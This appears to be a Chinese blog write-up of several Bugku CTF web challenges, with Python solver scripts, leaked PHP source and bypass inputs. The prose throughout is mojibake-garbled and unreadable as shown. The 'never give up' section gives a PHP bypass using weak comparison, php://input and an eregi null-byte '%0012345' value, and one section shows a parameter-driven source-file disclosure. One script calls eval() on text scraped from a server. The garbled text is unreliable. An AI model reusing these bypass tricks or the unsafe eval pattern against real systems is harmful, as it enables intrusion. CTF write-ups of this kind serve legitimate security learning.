<h2 id="ç§‹åå±±è€å¸æœº"><a class="header-anchor" href="#ç§‹åå±±è€å¸æœº">Â¶</a>ç§‹åå±±è€å¸æœº</h2>
<p>å–‚ï¼Œé«˜æ¡¥å‡‰ä»‹å—ï¼Ÿæˆ‘æ˜¯è—¤åŸæ‹“æµ·ï¼Œæˆ‘æƒ³åŠ å…¥â€¦è½¦é˜Ÿã€‚</p>
<p>å“ˆå“ˆï¼Œä¸å¥½æ„æ€ï¼Œèµ°é”™ç‰‡åœºäº†</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/2NGXH%7DD8~~%24%7BFV9YRG%2826QK.jpg" alt=""></p>
<p>æ‰“å¼€é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªå¾ˆé•¿çš„è®¡ç®—å¼å­ï¼Œè€Œä¸”2så†…åˆä¼šå‘ç”Ÿå˜åŒ–ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/X5_XP_O_%5BCZ%5DL1H1B%7BWIQPV.png" alt=""></p>
<p>ç¿»äº†ä¸€ä¸‹ç½‘é¡µæºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼ŒçŒœæµ‹æ˜¯éœ€è¦æˆ‘ä»¬å‘ä»–å‘é€ä¸€ä¸ªpostæ•°æ®åŒ…ï¼Œæ•°æ®ä¸ºå¼å­çš„è®¡ç®—å€¼ï¼Œä½†å®ƒæ²¡æœ‰ç»™å‡ºéœ€è¦ä¼ å‚çš„å¯¹è±¡æ˜¯ä»€ä¹ˆã€‚è€Œä¸”åœ¨2så†…è®¡ç®—å‡ºå€¼ä¸å¤ªå¯èƒ½ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªpythonè„šæœ¬è·‘ä¸€è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">a = re.findall(<span class="string">&#x27;&lt;div&gt;([0-9+*-]*)?&#x27;</span>, session.get(url).text)</span><br><span class="line"><span class="comment">#å› ä¸ºre.findallè¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹åˆ—è¡¨çš„å†…å®¹</span></span><br><span class="line">print(<span class="string">&quot;é¡µé¢çš„è®¡ç®—å¼å­ï¼š&quot;</span>,a[<span class="number">0</span>],<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = eval(a[<span class="number">0</span>])</span><br><span class="line">c = &#123;<span class="string">&quot;&quot;</span>:b&#125;</span><br><span class="line">result = session.post(url,c)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>å…ˆè§£é‡Šä¸€ä¸‹è„šæœ¬ï¼Œç”¨sessionä¿æŒä¸€ä¸ªä¼šè¯çŠ¶æ€ï¼Œå…å¾—ä¸‹æ¬¡postå‡ºå»çš„æ—¶å€™å°±æ˜¯å¦ä¸€ä¸ªè®¡ç®—å€¼äº†ï¼Œç„¶åç”¨æ­£åˆ™åŒ¹é…é¡µé¢å†…å®¹divåé¢çš„æ•°å­—å’ŒÂ±*ä¸‰ç§è¿ç®—ç¬¦ï¼Œåé¢çš„è¡¨ç¤ºåŒ¹é…å…¨éƒ¨ï¼Œ?è¡¨ç¤ºéè´ªå©ªåŒ¹é…ï¼Œç”¨evalè®¡ç®—æˆ‘ä»¬çš„å¼å­ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬ç»™ä¸€ä¸ªç©ºçš„å¯¹è±¡ä¼ è®¡ç®—çš„å€¼æµ‹è¯•æµ‹è¯•ï¼Œå› ä¸ºæˆ‘ä»¬ä¹Ÿä¸çŸ¥é“ç»™è°ä¼ å€¼</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/J%5D8U%28%5BUYQ9CQO95MUC%28FXRX.png" alt=""></p>
<p>è¿”å›é¡µé¢ç»“æœï¼Œæç¤ºæˆ‘ä»¬ç»™valueä¼ å€¼ï¼Œokï¼Œé‚£æˆ‘ä»¬åœ¨å­—å…¸ä¸Šå†å¡«ä¸Švalue</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">a = re.findall(<span class="string">&#x27;&lt;div&gt;([0-9+*-]*)?&#x27;</span>, session.get(url).text)</span><br><span class="line"><span class="comment">#å› ä¸ºre.findallè¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹åˆ—è¡¨çš„å†…å®¹</span></span><br><span class="line">print(<span class="string">&quot;é¡µé¢çš„è®¡ç®—å¼å­ï¼š&quot;</span>,a[<span class="number">0</span>],<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = eval(a[<span class="number">0</span>])</span><br><span class="line">c = &#123;<span class="string">&quot;value&quot;</span>:b&#125;</span><br><span class="line">result = session.post(url,c)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>çœ‹çœ‹ç»“æœ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/4JCI7%255O%60Q849KFX9M9%24V_B.png" alt=""></p>
<p>æ‹¿åˆ°flagï¼Œä¸‹ä¸€å…³ä¸‹ä¸€å…³ï¼ï¼ï¼</p>
</li>
<li>
<h2 id="é€Ÿåº¦è¦å¿«"><a class="header-anchor" href="#é€Ÿåº¦è¦å¿«">Â¶</a>é€Ÿåº¦è¦å¿«</h2>
<p>æ‰“å¼€é¡µé¢</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/8%40T~%7B%7D%607N0E4JJ%29JV%24K%40SWT.png" alt=""></p>
<p>è®©æˆ‘ä»¬å¿«ç‚¹ï¼Œå¥½ï¼Œé‚£æˆ‘å°±ç”¨burpsuiteæä¸€ä¸‹ä½ </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/%29EHX4V~L3USH7W%5B4%606%40M_WX.png" alt=""></p>
<p>å‘ç°å“åº”å¤´æœ‰flagï¼Œflagåé¢æ•°æ®è¢«base64åŠ å¯†äº†ï¼Œæˆ‘ä»¬å»è§£å†³ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/G%40K%28U69GOE7I7X%60U2%7DZX6ZJ.jpg" alt=""></p>
<p>å¥½å®¶ä¼™ï¼Œè¿˜æœ‰ä¸€ä¸²base64åŠ å¯†çš„æ•°æ®ï¼Œé‚£æˆ‘ä»¬å†è§£ä¸€é</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/P%24O581JD%5BGRO%7B%7B%24VPO6Y9RH.jpg" alt=""></p>
<p>é¢˜ç›®æç¤ºæˆ‘ä»¬flagçš„æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å»æŒ‰ç…§æ ¼å¼æäº¤ä¸€ä¸‹</p>
<p>â€¦emmç­”æ¡ˆä¸æ­£ç¡®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/MOJS0I82%60U3GCO7%7BC%29O%7D4GA.jpg" alt=""></p>
<p>åé¢å‘ç°æ¯æ¬¡æäº¤ä¸€æ¬¡åŒ…ï¼Œè¿”å›çš„flagéƒ½ä¸ä¸€æ ·</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/%7D%7DI~3MYXK%40AK%40L71HFANWR4.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/N9PFS22WWSK9~VW_2F_%409WP.jpg" alt=""></p>
<p>è¢«æ¼”äº†ä¸€æ‰‹ï¼Œæ³¨æ„åˆ°è¿”å›çš„æ•°æ®æç¤ºæˆ‘ä»¬éœ€è¦postå‘é€marginï¼Œåº”è¯¥æ˜¯å‘é€æ•°æ®margin:è§£å¯†åçš„flagã€‚ä½†å†æ¬¡å‘é€åè¿˜æ˜¯å›æ˜¾â€œæˆ‘æ„Ÿè§‰ä½ å¾—å¿«ç‚¹â€</p>
<p>é‚£æˆ‘ç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web6/&#x27;</span></span><br><span class="line">se = requests.session()</span><br><span class="line">flag = se.get(url).headers[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag = base64.b64decode(flag).decode()<span class="comment">#å¤šåŠ ä¸ªdecode(),æ˜¯å› ä¸ºä¸Šä¸€æ­¥ç”Ÿæˆçš„æ˜¯bytesç±»å‹ï¼Œè¦è½¬æ¢æˆstring</span></span><br><span class="line">flag = base64.b64decode(flag.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]) </span><br><span class="line">go = &#123;<span class="string">&#x27;margin&#x27;</span>:flag&#125;</span><br><span class="line">print(se.post(url,data=go).text)</span><br></pre></td></tr></table></figure>
<p>ç„¶åå¾—åˆ°flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/O1%24UM%29LIER5PAGC7OFY%29_TN.png" alt=""></p>
<p>è¿˜æ˜¯è§£é‡Šä¸€æ³¢è„šæœ¬å§ï¼Œé¦–å…ˆä½¿ç”¨sessionä¿æŒä¸€ä¸ªä¼šè¯çŠ¶æ€ï¼Œç„¶åå¾—åˆ°è¿”å›çš„å“åº”å¤´ä¸­çš„flagé‚£ä¸€æ¡æ•°æ®ã€‚ç»è¿‡ç¬¬ä¸€æ¬¡base64è§£å¯†ï¼Œç„¶åå–è§£å¯†å‡ºæ¥çš„é‚£ä¸€ä¸²å­—ç¬¦ä¸²ä¸­çš„â€˜ï¼šâ€™åé¢çš„é‚£ä¸€ä¸²base64åŠ å¯†çš„æ•°æ®è¿›è¡Œè§£å¯†ï¼Œæœ€åå‘é€ä¸€ä¸ªpostæ•°æ®åŒ…ï¼Œæ‰“å°å‡ºæ–‡æœ¬ä¿¡æ¯ã€‚</p>
</li>
<li>
<h2 id="cookiesæ¬ºéª—"><a class="header-anchor" href="#cookiesæ¬ºéª—">Â¶</a>cookiesæ¬ºéª—</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œæ˜¯ä¸€å¤§ä¸²æ²¡æœ‰ç”¨çš„å­—ç¬¦ä¸²(å› ä¸ºå°è¯•è§£å¯†äº†Næ¬¡â€¦)</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png" alt=""></p>
<p>æœ‰æ³¨æ„åˆ°filenameå‚æ•°åé¢è·Ÿçš„æ˜¯ä¸€ä¸²base64ç¼–ç ï¼Œå»è§£å¯†ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png" alt=""></p>
<p>è§£å¯†å¾—åˆ°keys.txtï¼Œåº”è¯¥è¿™æ˜¯ä¸ªçªç ´ç‚¹ï¼Œè®¿é—®ä¸€ä¸‹index.phpï¼Œæ³¨æ„è¦å…ˆè¿›è¡Œbase64ç¼–ç ï¼ŒæŒ‰ç…§å®ƒçš„æ–¹å¼ä¼ å‚ã€‚</p>
<p>index.phpç»è¿‡base64ç¼–ç åä¸ºï¼šaW5kZXgucGhw</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/PAAJKTHIOF1TTDZHYHWDZ%7BV.png" alt=""></p>
<p>åœ¨æºä»£ç ä¸­å‘ç°æœ‰ç‚¹æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè¿™æ—¶å€™æŠŠè§†çº¿å†è½¬ç§»åˆ°å¦ä¸€ä¸ªå‚æ•°lineã€‚å‰é¢åªæ˜¾ç¤º&lt;?phpï¼Œå¹¶ä¸å…¨ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯lineæ§åˆ¶æ˜¾ç¤ºçš„è¡Œæ•°</p>
<p>æˆ‘ä»¬å°è¯•æ›´æ”¹lineçš„å€¼</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/FQ%5B4IHZ%5BWK82R5C%29FQFGKQ9.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/88L4Y%7D0_M%28WV~LM%7BE%2968F%25I.png" alt=""></p>
<p>ç¡®è®¤lineå‚æ•°æ§åˆ¶æ˜¾ç¤ºçš„è¡Œæ•°äº†ï¼Œæˆ‘ä»¬å†™ä¸ªpythonè„šæœ¬è·‘ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">lines = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lines):</span><br><span class="line">    url = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>+str(i)+<span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">    res = requests.get(url).text</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
<p>è·‘å®Œå¾—åˆ°å®Œæ•´çš„æºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">	$fa = file($file);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>çœ‹æ¥éœ€è¦ä¼ å‚cookieï¼Œå¹¶ä¸”margin=marginæ‰èƒ½è®¿é—®keys.phpæ–‡ä»¶</p>
<p>keys.phpç»è¿‡base64ç¼–ç ä¸ºï¼ša2V5cy5waHA=</p>
<p>æˆ‘ä»¬å‘é€ä¸€ä¸‹åŒ…</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/2~FY~%5BQJ0HS%5B~JJTVR4F%5BDU.png" alt=""></p>
<p>åœ¨æºç ä¸­æ‰¾åˆ°flagå•¦~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/06ITHFL5I%5D%24GG%7B%7BQZIQ%254TU.png" alt=""></p>
</li>
<li>
<h2 id="never-give-up"><a class="header-anchor" href="#never-give-up">Â¶</a>never give up</h2>
<p>æ‰“å¼€é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸è¦æ”¾å¼ƒ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/RN9TL~G5NVGREJ2P1~4SW_T.png" alt=""></p>
<p>æŸ¥çœ‹ä¸€ä¸‹æºç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/8TN%7BV%40S90DH0UP%25JC%5BPH%40%5B1.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬æœ‰1p.htmlæ–‡ä»¶ï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/D9P%290%2482%60R9_Z99FV%24UC3JN.png" alt=""></p>
<p>å‘ç°æˆ‘ä»¬è¢«é‡å®šå‘åˆ°https://www.bugku.com/</p>
<p>ç”¨view-sourceæŸ¥çœ‹ä¸€ä¸‹æºç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/BU%5BB1%29%7DJEE6AUKVTM%255%5DQZ6.png" alt=""></p>
<p>çœ‹è§Wordsç”¨ç»è¿‡äº†urlç¼–ç ï¼Œå»è§£å¯†ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/1T%5D3K47GRNIAD83BXL%5DFMKP.png" alt=""></p>
<p>è¿˜æœ‰ä¸€ä¸²base64ç¼–ç è¿‡çš„æ•°æ®ï¼Œå†å»è§£å¯†ä¸€ä¸‹base64</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/GK%60TTFC%5B3%7BA9V%40XIWL%7BXGE5.png" alt=""></p>
<p>è¿˜å‰©ä¸€å±‚urlç¼–ç ï¼Œæˆ‘ä»¬å†è§£ä¸€éurl</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/M%28S7~6JS88E96NAC%60P%29Q_B9.png" alt=""></p>
<p>è§£å¯†åå¾—åˆ°æºç ï¼Œæ‹¼å‡‘èµ·æ¥å°±æ˜¯ä¸‹é¢è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--&quot;;if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;--&gt;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è§£é‡Šä¸€æ³¢ä»£ç ï¼š</p>
<p>1.é¦–å…ˆé™åˆ¶idå¿…é¡»ä¸ºéé›¶éç©º</p>
<p>2.ä¸€å…±éœ€è¦ä¼ å‚a,b,idä¸‰ä¸ªå‚æ•°</p>
<p>3.åŒ¹é…aä¸­æ˜¯å¦æœ‰.è¿™ä¸ªç¬¦å·</p>
<p>4.è¯»å–å˜é‡açš„å€¼åˆ°dataä¸­ï¼Œç”¨äº†file_get_contentså‡½æ•°ï¼Œæ‰€ä»¥açš„å€¼å¿…é¡»ä¸ºæ•°æ®æµ</p>
<p>5.åˆ¤æ–­dataç­‰äºå­—ç¬¦ä¸²&quot;bugku is a nice plateform!&quot;ï¼Œid==0ï¼Œbçš„é•¿åº¦è¦å¤§äº5</p>
<p>6.å­—ç¬¦ä¸²1114è¦ä¸å­—ç¬¦ä¸²111è¿æ¥å˜é‡bçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ„æˆæ­£åˆ™åŒ¹é…ï¼Œè€Œä¸”bçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½ä¸º4</p>
</blockquote>
<p>å¥½ï¼Œé‚£æˆ‘ä»¬è¦é‡‡ç”¨ä»€ä¹ˆå§¿åŠ¿ç»•è¿‡å‘¢ï¼Ÿ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¯¹äºå‚æ•°idï¼Œå› ä¸ºæ˜¯&#x3D;&#x3D;å¼±ç±»å‹æ¯”è¾ƒï¼Œå¯ä»¥ä½¿ç”¨0abcä¹‹ç±»çš„ç»•è¿‡ï¼Œå› ä¸º0abc&#x3D;&#x3D;æ¯”è¾ƒä¸º0</span><br><span class="line"></span><br><span class="line">å¯¹äºå‚æ•°aï¼Œå› ä¸ºæ˜¯è¯»å–æ•°æ®æµï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpåè®®ä¸­çš„inputï¼Œå³php:&#x2F;&#x2F;inputï¼Œå®ƒå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨postå‘é€æ•°æ®&quot;bugku is a nice plateform!&quot;</span><br><span class="line"></span><br><span class="line">å¯¹å‚æ•°bï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºå­—ç¬¦å¯¹ä»˜å®ƒã€‚å› ä¸ºeregi()å‡½æ•°å­˜åœ¨ç©ºå­—ç¬¦æˆªæ–­æ¼æ´ï¼Œå½“å‚æ•°ä¸­çš„å¾…åŒ¹é…å­—ç¬¦ä¸²æˆ–è€…æ­£åˆ™è¡¨è¾¾å¼é‡åˆ°ç©ºå­—ç¬¦åˆ™æˆªæ–­ï¼Œä¼šä¸¢å¼ƒåé¢çš„æ•°æ®ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ %0012345ã€‚è¿™é‡Œ%00æ˜¯ç©ºæ ¼ç»è¿‡urlç¼–ç åçš„å½¢å¼ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ä¸€å…±6ä¸ªé•¿åº¦ã€‚</span><br></pre></td></tr></table></figure>
<p>å¥½ï¼Œæˆ‘ä»¬å»è¯•è¯•å§</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/S%5BR1_E5%25%5DYA_LKG%28RSZ_VE6.png" alt=""></p>
<p>æˆåŠŸç»•è¿‡æ‹¿åˆ°flagäº†ã€‚</p>
<p>å…¶å®ï¼Œè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æºç ä¸­å¹¶æ²¡æœ‰é™åˆ¶æˆ‘ä»¬è®¿é—®f4l2a3g.txtæ–‡ä»¶ï¼Œåªæ˜¯å‘Šè¯‰æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ„é€ æ–¹å¼è®¿é—®ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®å¾—åˆ°flagï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ€ç»´ç‚¹ï¼Œæˆ‘è§‰å¾—ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/P%5DHY~JA4DCBADUQYCEJCT%28X.png" alt=""></p>
</li>
<li>
<h2 id="welcome-to-bugkuctf"><a class="header-anchor" href="#welcome-to-bugkuctf">Â¶</a>welcome to bugkuctf</h2>
<p>é¢˜ç›®æŒ‚æ‰ï¼Œæš‚æ—¶è·³è¿‡</p>
</li>
<li>
<h2 id="è¿‡ç‹—ä¸€å¥è¯"><a class="header-anchor" href="#è¿‡ç‹—ä¸€å¥è¯">Â¶</a>è¿‡ç‹—ä¸€å¥è¯</h2>
<p>é¢˜ç›®è¿˜æ˜¯æŒ‚äº†ï¼Œflagè¢«åˆ é™¤ï¼Œè·³è¿‡</p>
</li>
<li>
<h2 id="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"><a class="header-anchor" href="#å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ">Â¶</a>å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œç»™å‡ºä¸€ä¸²phpä»£ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/GUB%7D33H%7BYS%29_%2410R4TS%24CK8.png" alt=""></p>
<p>çœ‹åˆ°æœ‰å‡½æ•°preg_matchï¼Œå®ƒçš„åŠŸèƒ½ä¸ºç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²ï¼ŒåŒ¹é…æˆåŠŸè¿”å›1ï¼Œå¹¶æŠŠåŒ¹é…åˆ°çš„å€¼èµ‹å€¼ç»™matchï¼Œå¦åˆ™è¿”å›0ã€‚æœ€åæœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šè¾¹åŒ¹é…æˆåŠŸï¼Œå³å¯è¾“å‡ºflagã€‚</p>
<p>å¥½ï¼Œæ€è·¯å¾ˆæ¸…æ™°ï¼Œå°±æ˜¯åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼~</p>
<p>é¢˜ç›®ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š/key.*key.{4,7}key:/./(.*key)[a-z][[:punct:]]/i</p>
